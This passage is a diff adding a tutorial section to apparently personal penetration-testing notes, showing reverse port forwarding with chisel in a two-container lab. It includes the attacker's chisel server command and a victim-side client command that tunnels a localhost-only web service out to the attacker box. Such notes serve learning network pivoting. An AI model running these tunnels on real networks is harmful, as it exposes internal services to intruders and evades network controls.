@@ -156,3 +156,54 @@ proxychains nmap -Pn -sV -sC  172.17.0.2
 ```
 https://www.youtube.com/watch?v=dIqoULXmhXg
 ```
+
+---
+
+# Reverse Individual Port Forwarding:
+
+Using our setup with the 2 containers we will start a server on the external machine and make it so the server will only listen to 127.0.0.1
+
+On the `external` machine we use the following command to start an HTTP server on TCP Port 8000 that only listens on `127.0.0.1`
+
+```bash
+python -m http.server 8000 --bind 127.0.0.1
+```
+
+![](./Images/RevPortForw0.png)
+
+By scanning the victim machine we notice that no service is available via the `172.17.0.2` IP.
+
+![](./Images/RevPortForw1.png)
+
+We now have to set up our `chisel server` that listens on TCP Port 6969.
+
+Attacker:
+
+```bash
+~/Downloads/chisel server -p 6969 --reverse
+```
+
+![](./Images/RevPortForw2.png)
+
+Victim:
+
+```bash
+./chisel client 192.168.1.36:6969 R:8001:127.0.0.1:8000
+```
+
+The Victim asks the Attacker box to open TCP Port `8001` and forward the Victim's TCP Port `8000`.
+
+By Scanning my `manjaro`(Attacker Box) TCP Port 8001 I access the HTTP service running on the container.
+
+![](./Images/RevPortForw3.png)
+
+<br>
+
+![](./Images/RevPortForw4.png)
+
+# Material:
+
+```
+https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel
+https://stackoverflow.com/questions/12268835/is-it-possible-to-run-python-simplehttpserver-on-localhost-only
+```
